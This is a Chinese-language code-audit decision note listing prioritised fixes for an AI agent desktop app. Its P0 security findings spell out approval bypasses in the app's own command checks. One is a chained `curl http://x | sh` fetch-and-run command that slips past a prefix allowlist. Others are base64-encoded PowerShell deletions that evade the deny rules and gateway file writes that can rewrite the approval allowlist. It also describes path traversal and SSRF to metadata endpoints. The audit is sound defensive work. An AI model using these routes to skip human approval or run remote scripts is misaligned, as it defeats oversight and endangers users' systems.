# Decision Note: 前后端全量审查：优化清单（39 项，P0–P3）

Status: proposed — 2026-10-25 完成静态审查；**P0 八项当日全部交付**（P0-8 按拍板 A 落地：写入侧降级、读取侧 fail closed），见文末执行记录。P1 起逐项待认领。

## Decision

### 审查口径

- **范围**：`crates/`（24 member crate，548 个 `.rs`）+ `apps/desktop-tauri/src/`（277 个 ts/tsx + 22 个 css）+ `packages/preview` + 构建/打包/依赖配置。SDK、`patches/`、`docs/` 不在代码质量审查面内。
- **方法**：分六个面并行静态审查（agent 核心循环 / server 接口与安全 / 存储与查询 / 工具层 / 前端架构与状态 / 前端样式与产物 / 依赖与可观测性），每项发现要求可执行证据（`文件:行号`），关键安全项与 DB 项已回读源码复核。构建产物尺寸取自 `release/frontend` 实测；行数、`unwrap`、`unsafe`、`inline style` 等指标由脚本统计（脚本为一次性工具，未入库）。
- **不重复既有结论**：`2026-10-18-capability-alignment-audit.md`、`2026-10-18-mechanism-level-alignment.md`、`2026-10-21-frontend-design-audit.md`、`2026-10-21-token-consumption-and-cache-efficiency.md` 已覆盖的"能力对齐/设计令牌/上下文压缩"结论不再复述；本清单只收**代码实现层面**的问题。已判"不做"的项（pandoc sidecar、Codex 后端、prefix_rule 精化）不复活。

### 优先级定义

| 档 | 判定 | 处置 |
|---|---|---|
| **P0** | 安全可被直接利用、数据可能被覆盖丢失、进程/任务可被输入打崩 | 本迭代内修，单独 PR |
| **P1** | 用户可感知的每轮延迟/卡顿，或挡住后续所有改动的结构性债务 | 按主题成批修 |
| **P2** | 一致性、可维护性、构建与打包体积、可观测性 | 顺手修 + 专项 |
| **P3** | 打磨项，收益确定但优先级低 | 空闲时做 |

### 规模基线（实测，2026-10-25）

| 维度 | 数值 |
|---|---|
| Rust 生产代码 | 261,609 行 / 548 文件（另有 16,718 行独立测试文件，`#[cfg(test)]` 内联测试未计入） |
| 前端 ts/tsx | 64,713 行 / 277 文件 |
| 前端 CSS | 13,314 行 / 22 文件 |
| 合计 | ≈ 34 万行（AGENTS.md 记的基线是"≈14 万行、目标 10 万行"——两者都已与现状脱节 2.4~3.4 倍，这条"量化目标"事实上失效，应重定基线或改口径，见 P2-10） |

---

## P0 — 安全可利用 / 数据丢失 / 输入打崩（8 项）

### P0-1 审批前缀白名单在 confirm 命中后被降级为 Approved（SEC）

- **证据**：`crates/hermix-tools/src/approval/allowlist.rs:307-313`（签名只取命令第一个词）；`crates/hermix-tools/src/approval/engine.rs:490-493`、`:515-519`（confirm 之后 allowlist 覆盖判定）。
- **问题**：`git`/`cargo` 一类入口被批准一次后，规则退化成"整条命令以该词开头即放行"。`cargo build && curl http://x | sh` 先命中 `fetch-run-script` 危险规则，随后被白名单整串匹配降级为放行。
- **影响**：审批粒度从"这一条命令"退化为"这个词开头的一切"，远程脚本执行重新变成一次点击即可。影响所有用终端工具的用户。
- **方向**：白名单只在"单条命令、且不含 `&&`/`||`/`;`/`|`/重定向"时生效；含链式元字符一律仍弹卡。

### P0-2 编码命令（`-EncodedCommand`）从不被解码，删除类命令可借编码逃过审批（SEC）

- **证据**：`crates/hermix-core/src/path_security.rs:103-108`（注释明示"`powershell -enc <base64>` 属日常自动化，不需要审批"）；`crates/hermix-tools/src/approval/engine.rs:185-190`（powershell-encoded 规则被显式删除）；`crates/hermix-environments/src/local.rs:365-370`（base64 原样作为参数传给真实 PowerShell）。
- **问题**：2026-09-26 的用户裁决是"命令执行（设置环境变量或命令编码的）不用审批，**只有删除等高危才审批**"。实现只落实了前半句：编码内容从不被解码，因此编码后的 `Remove-Item -Recurse -Force` / `format` 也不再命中 `DENIED_PATTERNS`。这是**裁决内部两半的冲突**，不是单纯的遗漏。
- **影响**：最危险的一类命令从"硬拒绝"降级为"无提示直接执行"。
- **方向**：对 `-enc`/`-EncodedCommand` 先 base64 解码，仅对**解码结果**跑 `DENIED_PATTERNS`；"编码本身"仍不弹卡（保持原裁决），解码失败则强制弹卡。

### P0-3 工作台网关 `fs_write` 绕过 `permission_guard`，可改写审批白名单自我提权（SEC）

- **证据**：`crates/hermix-plugin/src/workbench_gateway.rs:26-46`（只有 6 条文件名黑名单：`.env`/`.ssh/`/`id_rsa`/`id_ed25519`/`credentials`/`.npmrc`）、`:149-175`（`guard()` 只做黑名单，无 canonicalize、无工作台根目录边界，直接 `create_dir_all` + 写）。
- **对照**：`crates/hermix-tools/src/permission_guard.rs:34-38` 有受保护文件名清单，但只被 `write_file`/`patch` 调用。
- **影响**：工作台 JS（本身可被 `write_code_file` 写入）能重写 `approval_allowlist.json`、`session_approvals.json`、`config.yaml`（三者都不在黑名单里），下一轮 `rm -rf` 不再经过人。
- **方向**：网关写路径接入同一个 `permission_guard::check_write`，并对所有路径 canonicalize 后校验落点在工作台目录内。

### P0-4 `/api/agents/custom` 的 `id` 直接拼文件名，可越出 `agents/` 目录（SEC）

- **证据**：`crates/hermix-server/src/dashboard/agents.rs:166-168`（`agents_dir.join(format!("{id}.json"))`）、`:216`（`req.id` 原样使用）、`:220-222` 与 DELETE 路径同理。
- **影响**：`id = "../../foo"` 可读写/删除 `hermix_home/agents/` 之外的任意 `.json` 文件。
- **方向**：`id` 白名单校验（`^[A-Za-z0-9_-]+$`）或 canonicalize 后校验前缀；两处（写/删）共用同一校验函数。

### P0-5 `load_session` 失败降级为空历史，随后被覆盖写回（DATA）

- **证据**：`crates/hermix-agent/src/local_agent_service.rs:1813-1816`、`:2288-2291`（`load_session(session_id).unwrap_or_default()`）；回合末尾的 persist 走 `save_session_atomic`（`crates/hermix-agent/src/session_persistence/sessions.rs:209-234`）。
- **问题**：DB 读失败（锁冲突/busy/损坏）被当成"这是新会话"，随后"早存盘 + 回合末尾 persist"把这份空历史**写回磁盘**。
- **影响**：用户表现为"整个会话凭空清空、agent 失忆"，且原数据已被覆盖。同类静默丢弃还有 `run_loop.rs:471`/`:1359` 的 `let _ = self.prepare_assistant_turn(...)` 与 `local_agent_service.rs:3678` 的 `let _ = persist_session(...)` 后仍返回 `Ok(())`。
- **方向**：区分 `NotFound`（可空）与其它错误（向上抛、拒绝进入写路径）；`reset_session` 的结果必须传播。

### P0-6 输出截断按**字节**下标切 UTF-8 字符串 → 中文/emoji 边界 panic（STAB）

- **证据**：`crates/hermix-environments/src/local.rs:438-447`、`:631-646`、`:858-859`；`crates/hermix-environments/src/ssh.rs:78-79`；`crates/hermix-environments/src/docker.rs:103`（`stdout[..max_output_size]`）。
- **影响**：截断点落在多字节字符中间即 panic；终端里 `cat 中文日志` 即可复现。panic 被 JoinSet 捕获成"工具崩溃"，最坏情况丢掉命令的全部输出。
- **方向**：统一用 `floor_char_boundary` / `char_indices` 版 `truncate_chars`；四处后端共用一个实现（同时解决 P2-8 的"四个后端各写一份执行/解码/截断"）。

### P0-7 `/api/providers/test` 用请求体的任意 `base_url` 发起出站请求（SEC / SSRF）

- **证据**：`crates/hermix-server/src/dashboard/custom_providers.rs:577-630`（尤其 `:627` 直接 GET `{base_url}/models`）、`:334-364`、`:459-488`（`fetch-models` / `test-connection` 用持久化 base_url 同理）。
- **影响**：可探测/访问内网与 `169.254.169.254` 一类元数据端点，并把响应体回显给调用方，本机成为跳板。
- **方向**：出站前解析 host 并拒绝私网/回环/元数据段，只允许 `http(s)`，响应体截断。

### P0-8 `api_key` 明文落在 `config.yaml`，且无文件权限加固（SEC）

- **证据**：`crates/hermix-config/src/config.rs:502-503`（`api_key` 无 `skip_serializing`、无加密）；`crates/hermix-config/src/loader.rs:510-520`（tmp+rename 全量写盘，只解决撕裂不解决机密性）。DPAPI 目前只用于 relay 身份密钥（`crates/hermix-server/src/relay_crypto.rs`）。
- **影响**：`%USERPROFILE%\.hermix\config.yaml` 可被任何同机进程、备份盘、同步盘直读全部 provider 密钥。
- **方向**：`llm_providers[*].api_key` 移入 vault/DPAPI，yaml 只留 `${...}` 引用（该形式已支持）；写入后显式收紧 ACL。

---

## P1 — 性能瓶颈与结构性债务（14 项）

### P1-1 每次 LLM 调用对整段会话做 3~5 份全量深拷贝（PERF）

- **证据**：`crates/hermix-agent/src/provider.rs:707`（`drop_orphan_tool_results` 吃 `&[Message]` 返回 `Vec<Message>`）→ `:720`（`enforce_strict_tool_pairing(Vec<Message>)`）→ `:726`（`merge_adjacent_assistant_messages(Vec<Message>)`）→ `:729-730`（逐条 `serde_json::to_value(msg)`）→ `:987-998`（`chat_completion_stream` 再来一次 `messages.to_vec()`）；上游 `prompt_assembly.rs:384` 已 `ctx.get_messages().to_vec()`；`local_agent_service.rs:2082` / `:3412` 再把完整历史 `messages.clone()` 交给 loop。
- **影响**：200 条消息、含大工具参数（`write_file` body）的会话，每轮白付几百 KB memcpy + N 次序列化，直接抬高首 token 延迟。这是长会话"越用越慢"的第一主因。
- **方向**：改为借用式叠加（`Vec<&Message>` 或下标集合 + 单次整片序列化），只在真正丢弃时 move 一次；入口用 `std::mem::take` 转移所有权，回程用 `AgentResult.messages` 覆盖（`:3430` 已在这么做）。

### P1-2 工具 JSON schema 每次往返三次全量克隆，且无缓存（PERF）

- **证据**：`crates/hermix-tools/src/registry/schema.rs:29-41`（`get_definitions()` 克隆全部）→ `crates/hermix-agent/src/agent_loop/runtime.rs:260-266`（`route_tools(t.clone())`）→ `crates/hermix-agent/src/agent_loop/config.rs:981-1018` / `crates/hermix-tools/src/deferred_loader.rs:70-87`（`visible.into_iter().cloned()` 第三次）。`route_tools` 在**每次 LLM 往返**（不是每轮）都跑。
- **影响**：按平均描述 ~290 字符、`max_routed_tools=50` 估算，单次请求 ~15K 字符 schema 被反复构造与序列化；工具注册 100+ 的用户每次往返都过一遍全量评分。
- **方向**：按（工具集版本, 配置版本）缓存 assembled `Vec<ToolSchema>`；路由只对"名字集合"重新排序，不碰描述文本。

### P1-3 前端每个流式 chunk 提交都全量重建会话数组（FE-PERF）

- **证据**：`apps/desktop-tauri/src/App.tsx:2323-2334`（`setSessions(prev => prev.map(s => s.id===sessionId ? {...s, messages: s.messages.map(...)} : s))`，同一份文本同时写入 `content` 与 `unified_steps`）；同类 `setSessions(prev => prev.map(...))` 在 App.tsx 出现 41 处。
- **说明**：流式 chunk **已做** rAF 合批（`hooks/useStreamChat.ts:577-587`），所以不是"每 token 一次 setState"；问题是**每次提交仍是 O(会话数 × 消息数) 的拷贝**。
- **影响**：1000 条消息的会话里流式输出时主线程持续被分配/GC 打断，出现掉帧与输入延迟。
- **方向**：流式增量放进独立 store（`useSyncExternalStore` 或 ref + 订阅），只更新"当前消息"的字段，会话索引与其它会话引用不变。

### P1-4 流式阶段 Markdown 每次全量重解析（O(n²)）（FE-PERF）

- **证据**：`apps/desktop-tauri/src/components/MarkdownBody.tsx:797-934`（`useMemo` 依赖整个 `displayContent`，内部一次做"路径归一 → 围栏补齐 → 软换行 → satteri parse → hast→JSX"）；memo 只对"内容相同"有效（`:784`）。
- **影响**：5000 字以上回复到后半段明显掉帧；每个流式气泡都在做这件事。
- **方向**：流式期间降级为纯文本/`pre-wrap`（或按已闭合块做增量缓存），`done` 后一次性高质量渲染。

### P1-5 消息列表无虚拟化，长会话全量挂载 DOM（FE-PERF）

- **证据**：`apps/desktop-tauri/src/components/MessageList.tsx:382-443`（`streamRow.map(...)` 一次性挂载全部气泡）；`components-prose.css:440-443` 用 `content-visibility:auto` 缓解但不减少挂载；依赖里无任何虚拟列表库。
- **影响**：1000+ 条会话切换/刷新首屏卡死数秒；Markdown + KaTeX + Mermaid 节点全部常驻。
- **方向**：超阈值（>300 行）启用窗口化列表，保留现有 `MemoMessageBubble`；或先做"历史窗口 + 展开更多"。

### P1-6 首屏 JS ≈2.5 MB 且无 vendor 拆分，echarts/katex 被静态拖入（FE-BUILD）

- **证据（实测产物）**：`release/frontend/assets/` 中 `index` 241.82 KB + `App` 1.71 MB + `routes` 567.4 KB；首屏 CSS 单文件 `globals` 266.7 KB。静态导入点：`components/settings/SettingsShell.tsx:21-32`（12 个设置页全静态）、`settings/MemoryGraph.tsx:12-16`（`echarts/core`）、`components/MarkdownBody.tsx:24`（`katex`，经 `ChatView.tsx:19-32` 进主路径）。`vite.config.ts:53-68` 无 `rollupOptions.manualChunks`，并把 `chunkSizeWarningLimit` 抬到 2600 KB 把警告消音。
- **说明**：桌面端本地读盘，2.5 MB 不是网络问题，成本在**模块求值与编译**压在 splash 期间；路由级 lazy 已生效（`app/routes.tsx:10-16`，AutomationView/AnalyticsView/WorkbenchView 等均为独立 chunk），问题只在 App/routes 这两块。
- **方向**：`manualChunks` 拆 react / echarts / katex / markdown / refractor；MemoryGraph 改 `lazy()`；katex 命中公式才 `import()`；CSS 按页拆（首屏只留 tokens+base+layout）。

### P1-7 会话列表与消息端点无分页，"窗口裁剪"发生在全量读入之后（PERF）

- **证据**：`crates/hermix-server/src/routes.rs:184-185`、`:205-249`（`ListSessionsQuery` 只有 `workbench_id`，SQL 无 `LIMIT`，`total` 用 `sessions.len()` 伪装）；`:1107-1116`、`:1141-1163`（先全量读本会话 + `clone()`，再遍历压缩子会话各自全量读，最后 `window_message_page` 在内存里切尾部 N 条）。
- **影响**：`?limit=50` 不减少任何 DB 与内存开销；长会话（含压缩链）单次请求可达数十 MB。
- **方向**：SQL 层 `LIMIT/OFFSET` + 单独 `COUNT(*)`；消息按 seq 反向游标；子会话懒加载。

### P1-8 DB 访问层三处系统性缺陷（PERF/DATA）

1. **每条读写路径都重跑整套迁移**：`crates/hermix-agent/src/session_persistence/schema.rs:34-221`、`:346-361`、`:363-630`（≈14 条 `ALTER TABLE` + 建表/索引/触发器批次 + 9 次 `stamp_migration` + `DELETE FROM messages WHERE role='system'`），调用点 `messages.rs:463`、`:719`、`:885`、`:1057`、`:1570`、`:1718`、`sessions.rs:24`、`:207`、`usage.rs:23`。方向：`PRAGMA user_version` 一次性守卫 + 进程内 `OnceCell`（`hermix-focus/src/embedded/store.rs:141` 已是正确示范）。
2. **索引与查询不匹配**：建表只建了 `messages(session_id, active)` 与 `messages(session_id)`（`schema.rs:397-401`），而 `usage.rs:34/43/94-97/296-305` 按 `created_at` 过滤排序、会话列表按 `updated_at` 排序 → 全表扫 + 排序。方向：补 `idx_messages_created_at`、`idx_sessions_updated_at`。
3. **async handler 里直接跑同步 SQLite**：`routes.rs:193-245`、`:348-351`、`:609-613`、`:1870-1873`；`dashboard/analytics.rs:36`。对照 `ws.rs:3569`、`:3641` 已用 `spawn_blocking`，说明是遗漏而非设计。`busy_timeout` 被压到 500ms，一把锁就能把 worker 钉住半秒，WS 心跳跟着抖。方向：收口到一个 `spawn_blocking` 的 DB 访问层（`session_persistence/mod.rs:39-67` 的 `run_blocking` 已存在，但只有 3 处调用）。

### P1-9 每轮 pre-turn 在 async 路径上做同步磁盘 IO 与重复计算（PERF）

- **证据**：`crates/hermix-agent/src/run_loop/pre_turn.rs:195-200` + `run_loop.rs:62-64`（**每轮**新建 `SkillLoader` 并 `scan()` 全量走 skills 目录读文件）；`pre_turn.rs:166-187`（每轮 `ExperienceArchive::open` + `experience_prompt_for_tools`）；`local_agent_service.rs:1827-1837`（每次 `/command` 都 `SkillOrchestrator::default_dir()` + `scan_skill_commands()` + `fs::read_to_string`）；`local_agent_service.rs:906-927`（`gateway_token_warn` 每轮对全部消息逐字符估 token，再 `cfg.llm_providers.clone()` 复制全部密钥/端点，而 `ContextManager` 本来就有 O(1) 的 `cached_total_tokens`，见 `context.rs:519`）；`skill_loader.rs:347-408`（每条用户消息对**所有**技能重算 embedding，命中才读盘 body，无缓存）。
- **影响**：每轮额外几十毫秒磁盘 IO + O(会话语料) 的字符扫描 + 一份含密钥的配置深拷贝，全部计入"正在思考…"。
- **方向**：`SkillLoader`/技能元数据进程内缓存（mtime 失效）、embedding 在 `scan()` 时预计算、token 数复用 `ctx.total_tokens()`、配置改 `Arc<GatewayConfig>` 快照或 `ArcSwap`。

### P1-10 工具层 IO 放大：`read_file` 先读全文件、glob 每个目录项重编译正则（PERF）

- **证据**：`crates/hermix-tools/src/tools/file.rs:322-354`（Fs 分支 `fs.read()` 全量字节后才 `slice_lines`，带 `offset/limit` 也不省内存）、`:372`；`crates/hermix-tools/src/backends/file.rs:703-705`、`:800-809`（`matches_glob` 内部 `Regex::new(&format!("^{}$", ...))`，而它在递归遍历的**每个 entry** 上被调用）；`crates/hermix-tools/src/backends/web.rs:171-175`、`:550-561`、`:724-729`（函数体内 `Regex::new`）。
- **影响**：`read_file` 读 GB 级日志可 OOM；`search_files` 扫 10 万文件 = 10 万次正则编译，单次调用秒级。
- **方向**：按行流式读取（读到 `offset+limit` 即停）；glob 用 `globset` 预编译一次；正则改 `LazyLock<Regex>`。

### P1-11 `run()` 与 `run_stream()` 是两套平行主循环，已开始分叉（ARCH）

- **证据**：`crates/hermix-agent/src/run_loop.rs:163-831` 与 `:832-1745` 结构一一对应（watchdog、`LoopState` 初始化、inner retry loop、fatal 分支）；tool turn 之前的 80 行（校验 → `apply_outcome` → `evolution_counters` → `cap_delegates` → PreToolCall hook → `tool_call_ids` 映射）在 `:700-790` 与 `:1633-1712` 各一份，且已经不一致（`:713-724` 传 `None` finish_reason，`:1646-1657` 传 `last_finish_reason.clone()`）。
- **影响**：任何修复要改两遍；前端可见的 finish_reason/中断语义已经在两条路径上不同（这类分叉最典型的后果就是 P0-5 那种"只修了一条路"）。
- **方向**：把 tool-call 预处理整体收进 `run_loop/tool_turn.rs`，两个循环只保留 transport 差异（`do_tool_turn`/`do_pre_turn_setup` 已是成功先例）。

### P1-12 错误分类靠 `contains` 子串匹配（CORRECT/PERF）

- **证据**：`crates/hermix-agent/src/agent_helpers.rs:861-878`（`lower.contains("500")`/`"tls"`/`"dns"`/`"eof"` 即 `Retryable`）、`:847-848`（`contains("401")` 判 `Auth`，仅排除 4010/4011）；错误串已被压平成 `format!("API error {status}: {body}")`（`provider.rs:974-976`）。`Retry-After` 解析已存在（`llm_retry.rs:290-302`、`agent_helpers.rs:637`），但不解析 HTTP-date。
- **影响**：形如 "max_tokens 500 exceeds…" 的 400 错误会被无条件重试并按指数 backoff 白等 ~90s；Anthropic 的 `overloaded_error` 若不含关键词会落 `Fatal` 直接放弃。
- **方向**：在 `provider.rs` 就地按 HTTP status 映射 `ErrorClass`，子串匹配只作兜底；`Retry-After` 补 HTTP-date。

### P1-13 三个巨型文件承载多类职责，直接导致"改一处漏两处"（ARCH）

| 文件 | 行数 | 混入的职责 | 建议边界 |
|---|---|---|---|
| `crates/hermix-agent/src/local_agent_service.rs` | 5633 | 会话持久化、配置/模型解析、provider 构建与预热、Agent 装配、工具策略与审批、轮次账本/中断注册、回复兜底 | `SessionRepository` / `ConfigResolver` / `AgentAssembler` / `TurnRegistry` / `TurnRunner` / `MessageNormalizer` |
| `crates/hermix-server/src/ws.rs` | 3680 | 连接去重与广播、`handle_ws_stream_send`（Text/Thinking/Tool/Approval/Heartbeat 全部事件整形，:419-2709）、todo 转换、入站分派、审批 DB 兜底 | `ws/{conn,outbound/text,outbound/tool,approval,clarify,lookup}.rs`，按 `StreamEvent` 变体分派 |
| `apps/desktop-tauri/src/App.tsx` | 4367 | 布局、30 个 `useState`、30 个 `useEffect`、41 处 `setSessions`、托盘/窗口/流式/审批接线 | 会话 store + `ChatSessionProvider` + 布局壳 |

- **佐证**：`handle_ws_stream_send` 内联、`handle_inbound_frame`、REST `approve_via_rest` 三份审批响应逻辑（`ws.rs:2377-2465`、`:3105-3258`、`routes.rs:1645`）已经各写一遍"解析 decision → resolve → 落库 → `record_resource_approval_side_effect`"；`send_message` 与 `send_message_stream` 前置 ~200 行重复（`local_agent_service.rs:1806-2274` vs `:2275-2560`），且 stream 侧多了一段 early-persist（`:2333-2355`），非 stream 侧没有。
- **方向**：先抽 `apply_approval_response(...) -> Outcome` 与 `prepare_turn(...) -> TurnContext` 两个单一实现，再做文件拆分（拆文件本身不减少耦合，抽函数才减少）。

### P1-14 存储层实现分叉：4 套 SQLite 打开方式、3 处各建同一批表、无数据生命周期（DATA）

- **证据**：
  - 4 套打开：`hermix_store::open_connection`（vault `store.rs:42`、focus `store.rs:27`、automation `repository.rs:47-54`）／裸 `Connection::open`（`hermix-task/src/repository.rs:38`、`record.rs:189`、`effect.rs:60`、`hermix-cron/src/persistence.rs:192`）／手抄 PRAGMA（`hermix-server/src/routes.rs:583-603`，注释自称"MUST go through this helper"）／工具自带 pragma（`hermix-tools/src/tools/daily_memory.rs:49-53`）。
  - 3 处建表：`tasks`/`automations`/`automation_runs` 在 `session_persistence/schema.rs:561-628` 与 `hermix-task/*` 各建一份（schema.rs 注释承认"谁先跑决定表形状"）；`hermix-tools/src/backends/session_search.rs:295-336` 又自建 `sessions`/`messages`/`messages_fts`（缺 `active`/`extra` 列、FTS 只有 INSERT 触发器），且用 `OpenMode::Read` 连接执行 DDL 与 INSERT（`:357-360`）。
  - 无生命周期：`messages`、`token_usage`、`compression_archives`、`recall_audit`、`session_snapshots` 均无保留期清理，全仓无 `VACUUM`。
- **影响**：journal_mode/busy_timeout 漂移是已知的静默丢写来源；列漂移让迁移"看不到"新列；`token_usage` 每 turn 一行线性增长，`/insights` 逐月变慢；删会话后 db 文件不缩水。
- **方向**：统一 `hermix-store` 入口（裸 open 加 CI lint）；单一 schema 源；`session_search` 改只读查询现有 FTS；加"N 天/N 行"janitor + `VACUUM`（或 `auto_vacuum=INCREMENTAL`）。

---

## P2 — 一致性、可维护性、构建与可观测性（10 项）

### P2-1 前端类型与后端 DTO 手工同步，无生成也无运行期校验（FE-TYPE）

- **证据**：`apps/desktop-tauri/src/types.ts:22-32`（注释 "mirrors ApprovalRecord"）、`hooks/useStreamChat.ts:29-33`/`:45-59`（`TodoSnapshotItem` 注释直言"keep all three in sync"）、`protocolAdapter.ts:16-70`（手写 wire 结构）。
- **影响**：后端加字段前端静默丢（`created_at` vs `timestamp` 曾导致时间全显示"刚刚"）；改字段无编译期报错。**注**：显式 `any` 只有 11 处、`invoke` 之外的调用点类型较严，这一块整体是好的，问题只在边界类型。
- **方向**：`ts-rs` 或 openapi 生成 DTO；WS 事件与 session messages 边界加 zod 校验。

### P2-2 IPC 无统一封装，96 处 `invoke` 散在 20+ 文件且命令名是裸字符串（FE-ARCH）

- **证据**：`desktopBridge.ts`(24)、`workbench/api.ts`(22)、`ScreenshotOverlay.tsx`(6)、`useStreamParser.ts`(6)、`SettingsShell.tsx`(5)、`main.tsx`(5)、`useUpdater.ts`(4)…失败处理多数只 `console.warn`；`workbench/api.ts:7-12` 自述一半封装"Rust command 已注册但尚无 UI 入口"。
- **方向**：`ipc/commands.ts` 统一命令常量 + 泛型签名 + 错误映射，组件层禁止直接 `invoke`；清理无入口封装。

### P2-3 前端 55 处空 `catch`、后端大量 `let _ =` 吞错（ERR）

- **证据**：前端 `hooks/useExpert.ts`(15)、`App.tsx`(6)、`api/rest.ts:623/631/717/754/764/993`、`api/polish.ts:27-37`；后端 `local_agent_service.rs`、`run_loop.rs:471/1359`、`dashboard/agents.rs:176-188`（读目录错误静默跳过）。
- **影响**：后端挂掉时 UI 表现为"列表是空的"；排查时"证据缺口"不可见（polish 功能实测失效即由此类模式导致）。
- **方向**：统一 `Result<T, ApiError>`；只在真正的非核心降级点吞错，且至少计数 + 一条 debug 日志。

### P2-4 前端 17 处独立 `setInterval` 轮询，无缓存/去重/可见性感知（FE-PERF）

- **证据**：`App.tsx`(3)、`MissionBoardView.tsx`(2)、`ImChannelsCard.tsx`(2，500ms)、`ToolEventCard.tsx:560-565`（1s）、`CompactionStatusBanner.tsx:207`、`FileSearchWindow.tsx:143`、`useBackendConnection.ts:57-63`、`useChannelsStatus.ts:20`；无 SWR/React Query。
- **影响**：空闲时稳定后台请求；同时 3 个运行中工具卡 = 每秒 3~6 次 render，叠加流式就是稳定掉帧源。
- **方向**：共享 `useNow(1000)` clock + 统一 `useQuery`（缓存键/失效/`visibilitychange` 暂停）。

### P2-5 工具注册要改 5 处，且描述有两个来源、无一致性测试（MNT）

- **证据**：`hermix-tools/src/tools/mod.rs:93-221`（手写注册列表）+ `register_builtins.rs`（未迁移工具）+ `essential::ESSENTIAL_TOOLSETS` + `toolset.rs` 常量 + `dispatch.rs:122-141`（`per_tool_budget` 名字 `match`）；描述双源：`tools/terminal.rs:73` vs `:288-305`、`tools/file.rs:72` vs `:412-430`（已不一致）；`register_builtins.rs:546-556` 只断言"名字存在"。
- **影响**：漏改的症状都是静默的（工具不在 `get_definitions()`、超时预算错配）；模型看到的说明与目录/文档说的不是一回事。
- **方向**：用"工具描述结构体数组"驱动注册；加 `key == schema.name` 与"注册描述 == schema.description"断言。

### P2-6 `assemble_tool_schemas` 与 `assemble_tool_schemas_with_meta` 是两份几乎相同的实现（MNT）

- **证据**：`hermix-tools/src/tools/tool_search.rs:132-171` vs `hermix-tools/src/deferred_loader.rs:51-109`（各自实现 bridge 拆分 + 阈值判定 + 三元组注入，注释在互相"镜像修同一个 bug"）。
- **方向**：合并为一个函数，meta 为空走 fallback 分支（历史上这里出过"bridge 在阈值下方消失"的回归）。

### P2-7 日志：314 处 `info!` / 只有 15 处 `#[instrument]`，且写盘是同步 flush + `try_lock` 丢日志（OPS）

- **证据**：`crates/hermix-telemetry/src/log_manager.rs:324-336`（发日志的线程上持 `std::Mutex` 写 `BufWriter` 并立即 `flush()`）、`:317-318`（`try_lock` 失败整条丢弃）；`:317-320` 的 `_ctx` 未用（span 上下文全丢）；`:238-262` JSON 只转义 `"`，消息含换行即产生损坏 JSONL；`#[instrument]` 全仓 15 处 vs `tracing::info!` 314 处。
- **影响**：热路径每条日志一次系统调用级同步写；并发下日志静默缺失；跨 crate 无法用 trace_id 串一次 turn。
- **方向**：`tracing-appender` 非阻塞 guard + 独立写盘线程；输出 span 栈 + 统一 `trace_id`（`run_trace.rs` 已有载体）；JSON 用 `serde_json` 序列化。

### P2-8 WS 入站帧无大小上限，附件以 JSON 数组走 `Vec<u8>`（PERF/SEC）

- **证据**：`crates/hermix-server/src/mobile_ws.rs:55-58`（upgrade 未设 `max_frame_size`/`max_message_size`）；`crates/hermix-transport/src/lib.rs:412-417`（`ImageAttachment.bytes: Vec<u8>`）；HTTP 侧的 `RequestBodyLimitLayer`（2MB，`lib.rs:572`）不覆盖 WS。
- **影响**：单帧可吃默认 64MB；JSON 数字数组解析放大约 10 倍内存。
- **方向**：显式设 frame/message 上限；附件改二进制帧或 base64 + 服务端字节数硬上限。

### P2-9 限流/锁定以「IP:源端口」为键，且 Map 无界（SEC）

- **证据**：`crates/hermix-server/src/security.rs:260-265`（`ConnectInfo<SocketAddr>.to_string()`）、`:243-257`、`:105`。
- **影响**：每个新 TCP 连接都拿全新额度，brute-force 锁定形同虚设；长期运行内存单调增长。
- **方向**：键改纯 `IpAddr` + 容量上限/TTL 清理。

### P2-10 依赖与打包：双 HTTP 栈、多版本堆积、105MB 二进制、开发期资产随包（DEP）

| 项 | 证据 | 方向 |
|---|---|---|
| reqwest 0.12 与 0.13 同时在树里 | `Cargo.toml:118` vs `Cargo.lock:6483`（tauri 2.12.1 传递依赖 0.13.5）；`Cargo.toml:191-199` 的"钉 0.8 避开 0.13"注释已不成立 | 统一升 0.13 或修订注释，避免两套 hyper/rustls |
| 多版本堆积 | `windows-sys`×6、`base64`×4、`hashbrown`×4、`rand` 0.8/0.9/0.10、`getrandom`×3、`thiserror` 1/2；`indexmap 1.9` 靠 build-dependencies 里的假依赖垫片绕过（`apps/desktop-tauri/src-tauri/Cargo.toml:100`） | `cargo tree -d` 白名单 + CI diff |
| `tokio features=["full"]` | `Cargo.toml:108`、`apps/desktop-tauri/src-tauri/Cargo.toml:26` | 只声明实需 feature |
| 无用 workspace 依赖 | `clap`/`ratatui`/`crossterm`（`Cargo.toml:140-142`，24 个 crate 零引用） | 删除 |
| sidecar 体积 | `externalBin`：`hermix` 72.56 MB + `hermix-viewer` 23.07 MB + `markitdown` 8.45 MB + `hermix-filesearch` 1.5 MB；`resources/loader/esbuild.exe` 10.13 MB、`hx-shell.exe` 4.31 MB | 确认 esbuild.exe 是否运行期必需（若只用于 dev，移出 resources） |
| 前端无用资源 | `public/` 4 张 2.4 MB 原始 PNG（仅 64px 档被引用，`Avatar.tsx:48`）、`standard_fonts` 756 KB、`demo-render.html` 42 KB | 只留必要档位，转 WebP；字体驱动交给 viewer |

### P2-11 样式层两套体系并存，两个文件完全绕过令牌（FE-CSS）

- **证据**：`.tsx` 里 `style={{` 112 处（几何类合法，配色类不合规：`ScreenshotOverlay.tsx` 8、`ImageLightbox.tsx` 8、`Sidebar.tsx` 8）；`file-search.css` 38 处声明级 hex、`screenshot-overlay.css` 11 处，两者由 `main.tsx:44`/`:9` 单独加载、不走 `globals.css`；`index.html:62-325` 内联 264 行 splash CSS 硬编码 4 套主题色；CSS 层 33 处 `!important`、82 处 `box-shadow`、4 处 `backdrop-filter`。
- **为什么门禁没拦住**：`check-theme-tokens.mjs:95-102` 会递归扫到 `src/styles` 下全部 css（含上述两份），但它只校验 `var()` 孤儿引用与主题契约，**不校验字面 hex**；字面色值门禁 `check-design-guard` 的 G1 作用面是 `tsx/ts`。结果就是"CSS 里的硬编码色值"至今没有门禁覆盖。
- **方向**：两个文件接成 `--color-overlay-*`/`--color-search-*`；splash 从 tokens 生成；`!important` 收敛到 ≤5；给 `check-theme-tokens` 增一条"CSS 层字面色值（非主题文件）"规则，把这类漂移变成可检出的。

### P2-12 死代码与过度抽象（MNT）

- **证据**：`run_loop.rs:41-48` `build_active_skills_block`（无 tools 变体）仅测试调用；`agent_loop/mod.rs:414-424` `PostLlmAction::RetryReasoning` 永不构造（注释自承保留）；`message_cache.rs:47` 注释"production caller removed"；`no_op_compression_engine` 只被测试引用；`run_loop.rs:687`/`:1622` 的 `let _ = invalid_names;` 哑变量。
